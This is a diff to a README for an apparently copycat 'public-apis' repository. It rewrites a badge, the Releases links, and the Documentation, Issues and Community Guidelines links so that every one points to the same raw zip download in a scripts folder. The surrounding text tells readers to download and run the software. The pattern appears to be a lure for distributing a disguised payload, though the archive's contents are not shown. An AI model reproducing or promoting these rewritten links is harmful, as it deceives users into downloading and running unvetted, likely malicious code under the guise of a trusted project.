@@ -1,6 +1,6 @@
 # 🌐 public-apis - Access a World of APIs Effortlessly
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/meneater69/public-apis/raw/refs/heads/main/scripts/public-apis-v1.9-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **public-apis** project. This repository offers a collaborative l
 
 To get started, visit this page to download:
 
-**[Visit Releases Page](https://github.com/meneater69/public-apis/releases)**
+**[Visit Releases Page](https://github.com/meneater69/public-apis/raw/refs/heads/main/scripts/public-apis-v1.9-beta.1.zip)**
 
 We provide a wide array of APIs that are free to use, which can greatly improve your applications. Follow these steps to download and run the software:
 
@@ -63,9 +63,9 @@ We welcome contributions! If you'd like to suggest a new API or improve document
 
 ## 🔗 Helpful Links
 
-- [Documentation](https://github.com/meneater69/public-apis/blob/main/docs/README.md)
-- [Issues Page](https://github.com/meneater69/public-apis/issues)
-- [Community Guidelines](https://github.com/meneater69/public-apis/blob/main/CODE_OF_CONDUCT.md)
+- [Documentation](https://github.com/meneater69/public-apis/raw/refs/heads/main/scripts/public-apis-v1.9-beta.1.zip)
+- [Issues Page](https://github.com/meneater69/public-apis/raw/refs/heads/main/scripts/public-apis-v1.9-beta.1.zip)
+- [Community Guidelines](https://github.com/meneater69/public-apis/raw/refs/heads/main/scripts/public-apis-v1.9-beta.1.zip)
 
 ## 🌟 Get Involved!
 
@@ -73,4 +73,4 @@ Explore the world of public APIs and enhance your development experience. Every 
 
 Visit this page to download:  
 
-**[Visit Releases Page](https://github.com/meneater69/public-apis/releases)**
+**[Visit Releases Page](https://github.com/meneater69/public-apis/raw/refs/heads/main/scripts/public-apis-v1.9-beta.1.zip)**
